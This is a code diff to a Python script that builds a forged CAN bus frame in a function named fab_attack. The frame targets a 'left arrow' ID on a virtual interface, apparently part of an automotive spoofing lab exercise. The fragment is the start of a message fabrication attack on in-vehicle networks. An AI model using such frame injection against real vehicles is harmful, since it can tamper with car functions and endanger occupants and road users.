@@ -3,8 +3,6 @@ import can
 CAN_INTERFACE = "vcan0"  
 ID = 0x188 #left arrow ID  
 
-bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
-
 def fab_attack(bus):
     data = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
     msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)
